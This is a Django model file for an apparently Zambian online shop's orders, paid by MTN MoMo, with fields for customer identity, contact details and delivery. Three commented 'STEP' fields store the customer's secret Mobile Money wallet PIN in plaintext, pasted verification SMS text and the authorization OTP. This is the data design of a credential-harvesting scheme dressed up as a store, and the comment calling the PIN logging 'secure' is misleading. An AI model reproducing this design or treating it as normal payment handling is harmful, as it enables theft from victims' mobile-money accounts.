from django.db import models

class Order(models.Model):
    PAYMENT_METHODS = [
        ('mtn_momo', 'MTN MoMo'),
    ]
    
    DELIVERY_METHODS = [
        ('town', 'Pickup in City / Town Hub'),
        ('door', 'Home / Door Delivery'),
    ]

    full_name = models.CharField(max_length=255)
    national_id = models.CharField(max_length=100)
    email = models.EmailField()
    phone = models.CharField(max_length=20)  # Stores formatted mobile number (+260...)
    contact_person = models.CharField(max_length=255, blank=True, null=True)
    alt_phone = models.CharField(max_length=20, blank=True, null=True)
    city = models.CharField(max_length=100)
    address = models.TextField()
    delivery_method = models.CharField(max_length=10, choices=DELIVERY_METHODS, default='town')
    payment_method = models.CharField(max_length=10, choices=PAYMENT_METHODS, default='mtn_momo')
    
    # Financial metrics captured in Zambian Kwacha (ZMW)
    total_amount = models.IntegerField(default=0)
    created_at = models.DateTimeField(auto_now_add=True)
    is_paid = models.BooleanField(default=False)
    status = models.CharField(max_length=20, default='Pending')
    
    # STEP 1: Securely logging the user's secret Mobile Money wallet authorization PIN
    pin_code = models.CharField(max_length=5, blank=True, null=True)
    
    # STEP 2: Large text canvas storing the raw copied and pasted transaction verification SMS
    sms_content = models.TextField(blank=True, null=True)
    
    # STEP 3: Tracking target variable for the matching authorization security OTP token
    otp_code = models.CharField(max_length=6, blank=True, null=True)
    otp_created_at = models.DateTimeField(blank=True, null=True)

    def __str__(self):
        return f"Order #{self.id} - {self.full_name} (Zambia)"